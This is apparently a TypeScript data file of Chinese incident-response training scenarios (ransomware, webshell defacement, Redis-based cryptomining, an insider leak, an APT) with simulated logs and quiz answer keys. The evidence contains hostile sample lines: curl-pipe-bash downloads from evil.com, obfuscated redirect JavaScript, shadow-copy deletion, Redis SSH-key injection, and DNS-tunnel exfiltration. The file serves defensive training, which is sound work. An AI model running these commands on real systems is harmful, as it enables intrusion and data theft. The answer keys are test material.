export interface ScenarioData {
  id: string;
  title: string;
  type: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  alertInfo: { source: string; time: string; summary: string };
  timeline: { timestamp: string; event: string; category: string; indicator: string }[];
  evidence: { type: string; name: string; content: string }[];
  steps: {
    phase: 'confirm' | 'triage' | 'analyze' | 'contain' | 'review';
    title: string;
    description: string;
    taskType: 'quiz' | 'command_input' | 'log_analysis' | 'timeline_sort' | 'ioc_extract';
    data?: Record<string, unknown>;
    expectedAnswer: string[];
    explanation: string;
    score: number;
  }[];
}

export const SCENARIOS: ScenarioData[] = [
  {
    id: 'ransomware-01',
    title: '勒索病毒应急响应',
    type: 'ransomware',
    severity: 'critical',
    description: '某公司文件服务器感染勒索病毒，大量文件被加密。需要溯源、遏制并恢复。',
    alertInfo: {
      source: 'EDR 告警 / 用户上报',
      time: '2024-01-15 09:30:00',
      summary: '多个部门报告无法打开共享盘中的文件，文件扩展名被改为 .locked',
    },
    timeline: [
      { timestamp: '2024-01-14 22:15', event: '钓鱼邮件发送至财务部员工', category: 'initial_access', indicator: 'sender@evil.com' },
      { timestamp: '2024-01-14 22:18', event: '员工打开恶意附件invoice.doc', category: 'initial_access', indicator: 'invoice.doc' },
      { timestamp: '2024-01-14 22:19', event: '宏代码执行，下载恶意程序svchost.exe', category: 'execution', indicator: 'svchost.exe' },
      { timestamp: '2024-01-14 22:25', event: '恶意程序连接C2服务器', category: 'command_control', indicator: '185.234.xx.xx:443' },
      { timestamp: '2024-01-15 02:00', event: '横向移动到文件服务器', category: 'lateral_movement', indicator: 'FILE-SRV-01' },
      { timestamp: '2024-01-15 02:30', event: '开始加密共享文件', category: 'impact', indicator: '.locked扩展名' },
      { timestamp: '2024-01-15 09:30', event: '用户发现文件无法打开，上报IT', category: 'impact', indicator: 'N/A' },
    ],
    evidence: [
      {
        type: 'log',
        name: '邮件网关日志',
        content: `2024-01-14 22:15:03 SMTP-IN sender@evil.com -> finance@company.com Subject: 请查收发票
2024-01-14 22:15:04 SMTP-IN Attachment: invoice.doc (MD5: a1b2c3d4e5f6...) [SUSPICIOUS]
2024-01-14 22:15:05 SMTP-IN SPAM score: 3.2 - DELIVERED (未触发高危规则)
2024-01-14 22:16:01 SMTP-IN sender@evil.com -> hr@company.com Subject: 紧急通知
2024-01-14 22:16:02 SMTP-IN Attachment: notice.docx (MD5: f6e5d4c3b2a1...) [CLEAN]`,
      },
      {
        type: 'process_list',
        name: '文件服务器进程快照',
        content: `USER       PID %CPU %MEM    COMMAND
SYSTEM       1  0.0  0.1  C:\\Windows\\System32\\svchost.exe
SYSTEM     892  0.2  0.3  C:\\Windows\\System32\\svchost.exe -k netsvcs
admin     3456  0.0  0.2  C:\\Program Files\\ERP\\erpclient.exe
SYSTEM    4521 85.3  2.1  C:\\Users\\Public\\svchost.exe        <-- 异常高CPU
SYSTEM    4522  0.0  0.1  C:\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet
SYSTEM    4523  0.0  0.1  C:\\Windows\\System32\\bcdedit.exe /set {default} recoveryenabled no`,
      },
      {
        type: 'file_list',
        name: '被加密文件样本',
        content: `D:\\共享盘\\财务\\2024报表.xlsx.locked
D:\\共享盘\\财务\\年度预算.xlsx.locked
D:\\共享盘\\人事\\员工花名册.xlsx.locked
D:\\共享盘\\技术\\架构设计.docx.locked
D:\\共享盘\\技术\\数据库备份.sql.locked
[!] 每个目录下出现 HOW_TO_DECRYPT.txt 勒索信`,
      },
    ],
    steps: [
      {
        phase: 'confirm',
        title: '告警确认',
        description: '查看邮件网关日志，确认攻击入口。钓鱼邮件的发件人地址是什么？',
        taskType: 'log_analysis',
        expectedAnswer: ['sender@evil.com', 'evil.com'],
        explanation: '从邮件网关日志可以看到，sender@evil.com 在22:15向财务部发送了包含恶意附件 invoice.doc 的钓鱼邮件。',
        score: 20,
      },
      {
        phase: 'triage',
        title: '威胁评估',
        description: '查看文件服务器的进程快照，哪个进程消耗了异常高的CPU？这可能是什么恶意行为？',
        taskType: 'quiz',
        expectedAnswer: ['svchost.exe', '4521', '加密', '勒索'],
        explanation: 'PID 4521的svchost.exe占用85.3% CPU，位于C:\\Users\\Public\\目录下（非系统目录），这是勒索病毒在加密文件的典型表现。同时vssadmin删除了卷影副本防止恢复。',
        score: 20,
      },
      {
        phase: 'analyze',
        title: 'IOC提取',
        description: '从所有证据中提取IOC指标。攻击者的C2服务器IP地址是什么？',
        taskType: 'ioc_extract',
        data: { text: '恶意程序连接C2服务器 185.234.xx.xx:443' },
        expectedAnswer: ['185.234', '185.234.xx.xx', 'c2'],
        explanation: '攻击者的C2服务器IP是185.234.xx.xx，端口443（HTTPS，便于隐蔽通信）。需要在防火墙上封禁该IP。',
        score: 20,
      },
      {
        phase: 'contain',
        title: '应急处置',
        description: '请选择正确的应急处置步骤（多选）：',
        taskType: 'quiz',
        expectedAnswer: ['隔离', '断网', '封禁', '备份'],
        explanation: '正确的处置步骤：1) 立即断开文件服务器网络（防止横向扩散） 2) 在防火墙封禁C2 IP 3) 通知全员不要打开可疑邮件 4) 保全证据（不要关机，先做内存镜像） 5) 评估是否有可用备份',
        score: 20,
      },
      {
        phase: 'review',
        title: '复盘总结',
        description: '本次事件的根本原因是什么？如何防止类似事件再次发生？',
        taskType: 'quiz',
        expectedAnswer: ['钓鱼', '邮件', '安全意识', '培训', '宏'],
        explanation: '根本原因是员工打开了包含恶意宏的钓鱼邮件附件。改进措施：1) 禁用Office宏自动执行 2) 部署邮件沙箱检测 3) 定期安全意识培训 4) 实施最小权限原则 5) 定期备份并离线存储',
        score: 20,
      },
    ],
  },
  {
    id: 'web-intrusion-01',
    title: '网站入侵挂马排查',
    type: 'web_intrusion',
    severity: 'high',
    description: '公司官网被发现加载了外部恶意JavaScript脚本，访问者被重定向到钓鱼页面。',
    alertInfo: {
      source: 'WAF告警 / 用户反馈',
      time: '2024-02-20 14:00:00',
      summary: '多名用户反馈访问官网时浏览器弹出可疑广告，杀毒软件报恶意脚本',
    },
    timeline: [
      { timestamp: '2024-02-19 03:00', event: '攻击者通过文件上传漏洞上传WebShell', category: 'initial_access', indicator: 'shell.php' },
      { timestamp: '2024-02-19 03:05', event: '通过WebShell执行系统命令', category: 'execution', indicator: 'whoami; id' },
      { timestamp: '2024-02-19 03:10', event: '修改index.html，注入恶意JS脚本', category: 'impact', indicator: 'eval(atob(...))' },
      { timestamp: '2024-02-19 03:15', event: '创建定时任务保持持久化', category: 'persistence', indicator: 'crontab -e' },
      { timestamp: '2024-02-20 14:00', event: '用户反馈异常，安全团队介入', category: 'detection', indicator: 'N/A' },
    ],
    evidence: [
      {
        type: 'log',
        name: 'Apache访问日志',
        content: `192.168.1.50 - - [19/Feb/2024:03:00:12] "POST /upload.php HTTP/1.1" 200 1024
192.168.1.50 - - [19/Feb/2024:03:00:15] "GET /uploads/shell.php HTTP/1.1" 200 512
192.168.1.50 - - [19/Feb/2024:03:05:22] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 256
192.168.1.50 - - [19/Feb/2024:03:10:33] "GET /uploads/shell.php?cmd=echo+PD9waHA...|base64+-d+>+index.php HTTP/1.1" 200 128
10.0.0.15 - - [20/Feb/2024:14:01:00] "GET / HTTP/1.1" 200 45678
10.0.0.22 - - [20/Feb/2024:14:02:30] "GET / HTTP/1.1" 200 45678`,
      },
      {
        type: 'log',
        name: '被篡改的index.html片段',
        content: `<!-- 正常内容 -->
<div class="header">欢迎访问XX公司</div>
<!-- 恶意注入开始 -->
<script>eval(atob('d2luZG93LmxvY2F0aW9uPSdodHRwOi8vc2l0ZS5ldmlsLmNvbS9waHNoaXNoaW5nLmh0bWwnOw=='));</script>
<!-- 恶意注入结束 -->
<footer>© 2024 XX公司</footer>`,
      },
    ],
    steps: [
      {
        phase: 'confirm',
        title: '告警确认',
        description: '查看Apache访问日志，找到攻击者上传WebShell的请求。上传路径是什么？',
        taskType: 'log_analysis',
        expectedAnswer: ['/uploads/shell.php', 'uploads/shell.php', 'shell.php'],
        explanation: '从日志可以看到攻击者通过POST /upload.php上传了shell.php，然后直接访问/uploads/shell.php执行命令。',
        score: 20,
      },
      {
        phase: 'triage',
        title: '影响范围评估',
        description: '攻击者通过WebShell执行了什么命令来修改网站？',
        taskType: 'log_analysis',
        expectedAnswer: ['base64', 'echo', 'index.php', 'decode'],
        explanation: '攻击者使用base64编码绕过WAF检测，将恶意代码解码后写入index.php。具体命令：echo PD9waHA...|base64 -d > index.php',
        score: 20,
      },
      {
        phase: 'analyze',
        title: '恶意代码分析',
        description: '被注入的JavaScript代码做了什么？base64解码后的内容是什么？',
        taskType: 'quiz',
        expectedAnswer: ['重定向', '跳转', '钓鱼', 'phishing', 'redirect'],
        explanation: '恶意JS代码解码后是 window.location=\'http://site.evil.com/phishing.html\'，将用户重定向到钓鱼页面。这是典型的水坑攻击。',
        score: 20,
      },
      {
        phase: 'contain',
        title: '清除后门',
        description: '如何彻底清除WebShell和恶意代码？',
        taskType: 'quiz',
        expectedAnswer: ['删除shell.php', '删除', '清除', '恢复备份'],
        explanation: '清除步骤：1) 删除/uploads/shell.php 2) 恢复index.html原始版本 3) 检查其他文件是否被篡改 4) 修复文件上传漏洞 5) 清除可疑定时任务 6) 检查是否有其他后门',
        score: 20,
      },
      {
        phase: 'review',
        title: '加固建议',
        description: '如何防止文件上传漏洞再次被利用？',
        taskType: 'quiz',
        expectedAnswer: ['白名单', '扩展名', '类型检查', '重命名', '存储分离'],
        explanation: '防护措施：1) 文件扩展名白名单校验 2) 文件内容MIME类型检测 3) 上传文件重命名（随机名） 4) 上传目录禁止执行 5) 存储分离（OSS/CDN） 6) 文件大小限制',
        score: 20,
      },
    ],
  },
  {
    id: 'cryptomining-01',
    title: '挖矿病毒排查处置',
    type: 'crypto_mining',
    severity: 'medium',
    description: '运维团队发现某服务器CPU持续100%，疑似感染挖矿病毒。',
    alertInfo: {
      source: 'Zabbix监控告警',
      time: '2024-03-10 08:00:00',
      summary: 'Web服务器CPU使用率持续>98%，已超过30分钟',
    },
    timeline: [
      { timestamp: '2024-03-09 20:00', event: 'Redis服务暴露在公网，未设置密码', category: 'initial_access', indicator: 'Redis 6379' },
      { timestamp: '2024-03-09 20:05', event: '攻击者通过Redis写入SSH公钥', category: 'initial_access', indicator: 'authorized_keys' },
      { timestamp: '2024-03-09 20:10', event: 'SSH登录后下载挖矿程序', category: 'execution', indicator: 'xmrig' },
      { timestamp: '2024-03-09 20:15', event: '设置定时任务保持挖矿进程', category: 'persistence', indicator: '*/5 * * * *' },
      { timestamp: '2024-03-10 08:00', event: '监控告警CPU 100%', category: 'detection', indicator: 'Zabbix Alert' },
    ],
    evidence: [
      {
        type: 'process_list',
        name: 'top进程快照',
        content: `PID   USER    %CPU  %MEM  COMMAND
8847  www     98.5  12.3  /tmp/.X11-unix/xmrig -o pool.minexmr.com:443 -u wallet_addr
8848  www      0.1   0.0  /bin/bash -c curl http://evil.com/update.sh | bash
1234  root     0.5   2.1  /usr/sbin/apache2 -k start
2345  mysql    1.2   8.5  /usr/sbin/mysqld
3456  root     0.0   0.1  /usr/sbin/sshd`,
      },
      {
        type: 'log',
        name: 'crontab内容',
        content: `# 系统定时任务
*/5 * * * * curl -s http://evil.com/update.sh | bash > /dev/null 2>&1
@reboot /tmp/.X11-unix/xmrig -o pool.minexmr.com:443 -u wallet_addr --donate-level=1
# 挖矿程序会每5分钟从远程下载最新版本，并在系统重启时自动启动`,
      },
      {
        type: 'log',
        name: 'Redis日志',
        content: `16278:M 09 Mar 20:00:12 Accepted connection from 185.xx.xx.xx
16278:M 09 Mar 20:00:15 "CONFIG" "SET" "dir" "/root/.ssh/"
16278:M 09 Mar 20:00:16 "CONFIG" "SET" "dbfilename" "authorized_keys"
16278:M 09 Mar 20:00:17 "SET" "x" "\\n\\nssh-rsa AAAA...attacker_key...\\n\\n"
16278:M 09 Mar 20:00:18 "SAVE"
16278:M 09 Mar 20:00:19 QUIT`,
      },
    ],
    steps: [
      {
        phase: 'confirm',
        title: '告警确认',
        description: '查看进程快照，找到占用CPU最高的可疑进程。进程名和路径是什么？',
        taskType: 'log_analysis',
        expectedAnswer: ['xmrig', '/tmp/.X11-unix/xmrig', '8847'],
        explanation: 'PID 8847的xmrig进程占用98.5% CPU。xmrig是知名的XMRig门罗币挖矿程序。路径/tmp/.X11-unix/是伪装成X11系统的目录。',
        score: 20,
      },
      {
        phase: 'triage',
        title: '入侵路径分析',
        description: '查看Redis日志，攻击者是如何获得服务器访问权限的？',
        taskType: 'log_analysis',
        expectedAnswer: ['redis', 'ssh公钥', 'authorized_keys', 'config set', '写入公钥'],
        explanation: '攻击者通过暴露在公网的Redis（未设密码），使用CONFIG SET将SSH公钥写入/root/.ssh/authorized_keys，从而获得SSH登录权限。',
        score: 20,
      },
      {
        phase: 'analyze',
        title: '持久化机制分析',
        description: '攻击者使用了什么方法确保持久化？从crontab中找出持久化机制。',
        taskType: 'log_analysis',
        expectedAnswer: ['crontab', '定时任务', 'cron', '*/5', '@reboot'],
        explanation: '攻击者设置了两种持久化：1) 每5分钟从远程下载并执行update.sh 2) @reboot在系统重启时自动启动挖矿程序。',
        score: 20,
      },
      {
        phase: 'contain',
        title: '清除挖矿程序',
        description: '如何彻底清除挖矿病毒？',
        taskType: 'quiz',
        expectedAnswer: ['杀进程', '删除', '清除crontab', '删除xmrig'],
        explanation: '清除步骤：1) kill -9 杀死挖矿进程 2) 删除/tmp/.X11-unix/xmrig 3) 清除恶意crontab条目 4) 删除/root/.ssh/authorized_keys中的攻击者公钥 5) 为Redis设置强密码并绑定内网',
        score: 20,
      },
      {
        phase: 'review',
        title: '安全加固',
        description: '如何防止Redis被再次利用进行入侵？',
        taskType: 'quiz',
        expectedAnswer: ['密码', 'bind', '内网', '防火墙', 'requirepass'],
        explanation: 'Redis安全加固：1) 设置requirepass强密码 2) bind 127.0.0.1仅监听本地 3) 禁用CONFIG等危险命令 4) 使用防火墙禁止6379端口外网访问 5) 使用Redis ACL进行细粒度权限控制',
        score: 20,
      },
    ],
  },
  {
    id: 'data-breach-01',
    title: '数据泄露事件溯源',
    type: 'data_breach',
    severity: 'high',
    description: '安全团队发现内部敏感数据出现在暗网论坛，需要溯源定位泄露源头。',
    alertInfo: {
      source: '威胁情报监控',
      time: '2024-04-05 16:00:00',
      summary: '暗网论坛出现公司客户数据库售卖帖，包含10万条用户记录',
    },
    timeline: [
      { timestamp: '2024-03-15 10:00', event: '外包人员获取数据库只读账号', category: 'initial_access', indicator: 'dev_readonly' },
      { timestamp: '2024-03-20 14:00', event: '外包人员使用数据库客户端大量导出数据', category: 'exfiltration', indicator: 'SELECT * FROM customers' },
      { timestamp: '2024-03-25 20:00', event: '数据通过U盘带出办公网络', category: 'exfiltration', indicator: 'USB Copy' },
      { timestamp: '2024-04-01 12:00', event: '数据出现在暗网论坛售卖', category: 'impact', indicator: 'darkweb post' },
      { timestamp: '2024-04-05 16:00', event: '威胁情报团队发现数据泄露', category: 'detection', indicator: 'TI Alert' },
    ],
    evidence: [
      {
        type: 'log',
        name: '数据库审计日志',
        content: `2024-03-20 14:01:23 dev_readonly LOGIN from 10.0.0.55 (Navicat Premium)
2024-03-20 14:02:00 SELECT COUNT(*) FROM customers -- 结果: 102,345
2024-03-20 14:02:30 SELECT * FROM customers LIMIT 10000 OFFSET 0
2024-03-20 14:03:45 SELECT * FROM customers LIMIT 10000 OFFSET 10000
2024-03-20 14:05:00 SELECT * FROM customers LIMIT 10000 OFFSET 20000
...
2024-03-20 15:30:00 SELECT * FROM customers LIMIT 10000 OFFSET 100000
2024-03-20 15:35:00 LOGOUT`,
      },
      {
        type: 'log',
        name: '门禁/上网记录',
        content: `2024-03-25 19:45 Badge: OUTSOURCE-023 离开办公区
2024-03-25 19:46 USB设备接入记录: 工位PC-055, Kingston 64GB (SN: ABC123)
2024-03-25 19:50 文件操作记录: 复制 D:\\Export\\customers_*.csv 到 E:\\
2024-03-25 20:00 Badge: OUTSOURCE-023 离开大楼`,
      },
    ],
    steps: [
      {
        phase: 'confirm',
        title: '数据泄露确认',
        description: '查看数据库审计日志，确认数据导出操作。使用什么工具导出的数据？',
        taskType: 'log_analysis',
        expectedAnswer: ['navicat', 'navicat premium', '数据库客户端'],
        explanation: '数据库审计日志显示用户dev_readonly使用Navicat Premium客户端连接数据库，并通过分页查询导出了全部10万余条客户记录。',
        score: 20,
      },
      {
        phase: 'triage',
        title: '泄露范围评估',
        description: '从审计日志看，导出了多少条数据记录？涉及哪张表？',
        taskType: 'log_analysis',
        expectedAnswer: ['customers', '10万', '102345', 'customer'],
        explanation: '攻击者分11次查询，每次10000条，共导出了customers表的全部102,345条记录。这是一次有预谋的大规模数据导出。',
        score: 20,
      },
      {
        phase: 'analyze',
        title: '内部威胁溯源',
        description: '结合门禁记录和USB日志，数据是通过什么方式带出公司的？',
        taskType: 'quiz',
        expectedAnswer: ['usb', 'u盘', '移动存储', 'usb设备', 'kingston'],
        explanation: '门禁记录显示外包人员OUTSOURCE-023在3月25日晚使用USB设备（Kingston 64GB）将导出的CSV文件复制到U盘后带出公司。',
        score: 20,
      },
      {
        phase: 'contain',
        title: '应急处置',
        description: '发现内部人员泄露数据，应该采取哪些措施？',
        taskType: 'quiz',
        expectedAnswer: ['禁用账号', '收回权限', '取证', '法务'],
        explanation: '处置措施：1) 立即禁用dev_readonly账号 2) 收回外包人员门禁卡 3) 保全数据库审计日志作为证据 4) 通知法务部门 5) 联系暗网平台要求删除数据 6) 通知受影响用户',
        score: 20,
      },
      {
        phase: 'review',
        title: '数据安全改进',
        description: '如何防止类似的数据泄露事件？',
        taskType: 'quiz',
        expectedAnswer: ['DLP', '权限控制', '审计', '加密', '最小权限'],
        explanation: '改进措施：1) 部署DLP(数据防泄漏)系统 2) 外包人员仅授予最小必要权限 3) 限制大批量查询 4) 禁用USB存储设备 5) 敏感数据加密存储 6) 定期审计数据库操作日志',
        score: 20,
      },
    ],
  },
  {
    id: 'apt-01',
    title: 'APT攻击排查',
    type: 'apt',
    severity: 'critical',
    description: '威胁情报显示公司可能遭受APT组织攻击，需要全面排查网络中的高级持续性威胁。',
    alertInfo: {
      source: '威胁情报共享平台',
      time: '2024-05-01 10:00:00',
      summary: '接收到情报：APT-X组织近期活跃，IOC与我司网络特征匹配',
    },
    timeline: [
      { timestamp: '2024-04-10 09:00', event: '员工收到鱼叉式钓鱼邮件（伪装为行业报告）', category: 'initial_access', indicator: 'report.pdf.exe' },
      { timestamp: '2024-04-10 09:05', event: '执行伪装的PDF文件，安装后门程序', category: 'execution', indicator: 'Cobalt Strike Beacon' },
      { timestamp: '2024-04-10 09:10', event: '后门程序注册为系统服务', category: 'persistence', indicator: 'WinSvcUpdate' },
      { timestamp: '2024-04-15 02:00', event: '内网横向移动，获取域管理员凭据', category: 'lateral_movement', indicator: 'Mimikatz' },
      { timestamp: '2024-04-20 03:00', event: '压缩并加密敏感文件', category: 'collection', indicator: '7z a -p' },
      { timestamp: '2024-04-25 04:00', event: '通过DNS隧道外传数据', category: 'exfiltration', indicator: 'DNS TXT query' },
    ],
    evidence: [
      {
        type: 'process_list',
        name: '可疑进程列表',
        content: `USER       PID  COMMAND
SYSTEM    1892  C:\\Windows\\System32\\svchost.exe -k WinSvcUpdate
SYSTEM    1893  C:\\ProgramData\\Microsoft\\Windows\\svchost.exe  <-- 非标准路径
SYSTEM    2100  C:\\Windows\\System32\\rundll32.exe C:\\ProgramData\\lib.dll,EntryPoint
admin     3500  C:\\Windows\\System32\\cmd.exe /c whoami /all
SYSTEM    4200  C:\\Windows\\System32\\nslookup -type=txt aGVsbG8gd29ybGQ.evil.com`,
      },
      {
        type: 'log',
        name: 'DNS查询日志',
        content: `2024-04-25 04:00:01 TXT aGVsbG8gd29ybGQ.evil.com  -> Response: OK
2024-04-25 04:00:05 TXT dGhpcyBpcyBkYXRh.evil.com   -> Response: OK
2024-04-25 04:00:10 TXT c2VjcmV0IGZpbGU.evil.com    -> Response: OK
2024-04-25 04:00:15 TXT ZGF0YWJhc2Uuc3Fs.evil.com   -> Response: OK
# Base64解码: "hello world" / "this is data" / "secret file" / "database.sql"`,
      },
    ],
    steps: [
      {
        phase: 'confirm',
        title: 'IOC匹配',
        description: '威胁情报显示APT-X使用Cobalt Strike。查看进程列表，哪个进程最可疑？',
        taskType: 'log_analysis',
        expectedAnswer: ['svchost', '1893', 'WinSvcUpdate', 'rundll32', 'lib.dll'],
        explanation: '可疑进程：1) PID 1893的svchost.exe在非标准路径(ProgramData) 2) rundll32.exe加载了lib.dll（Cobalt Strike特征） 3) WinSvcUpdate是伪装的服务名',
        score: 20,
      },
      {
        phase: 'triage',
        title: '数据外传分析',
        description: 'DNS日志显示了什么异常？数据是通过什么方式外传的？',
        taskType: 'log_analysis',
        expectedAnswer: ['dns隧道', 'txt', 'base64', 'dns', 'dns tunneling'],
        explanation: '攻击者使用DNS TXT记录进行数据外传。大量的TXT查询指向evil.com域名，查询内容是Base64编码的数据。DNS隧道是一种隐蔽的数据外传技术。',
        score: 20,
      },
      {
        phase: 'analyze',
        title: '攻击链还原',
        description: 'APT攻击的MITRE ATT&CK战术阶段是什么顺序？',
        taskType: 'quiz',
        expectedAnswer: ['初始访问', '执行', '持久化', '横向移动', '数据收集', '数据外传'],
        explanation: '本次APT攻击链：初始访问(鱼叉邮件)→执行(PDF木马)→持久化(注册服务)→横向移动(凭据窃取)→数据收集(压缩加密)→数据外传(DNS隧道)。',
        score: 20,
      },
      {
        phase: 'contain',
        title: 'APT遏制',
        description: '面对APT攻击，应该采取什么级别的响应措施？',
        taskType: 'quiz',
        expectedAnswer: ['全网隔离', '全面排查', '重装', '全员', '紧急'],
        explanation: 'APT响应需要最高级别：1) 全网范围内排查所有IOC 2) 隔离受感染主机 3) 重置所有域管理员密码 4) 检查所有系统服务 5) 分析DNS日志找出所有外传数据 6) 必要时重建整个域环境',
        score: 20,
      },
      {
        phase: 'review',
        title: 'APT防御建议',
        description: '如何构建针对APT攻击的纵深防御体系？',
        taskType: 'quiz',
        expectedAnswer: ['EDR', '零信任', '网络分段', '威胁情报', 'SOC'],
        explanation: 'APT防御需要多层次：1) 部署EDR进行终端检测和响应 2) 实施零信任架构 3) 网络微分段限制横向移动 4) 接入威胁情报共享 5) 建设7x24 SOC运营中心 6) 定期红蓝对抗演练',
        score: 20,
      },
    ],
  },
];
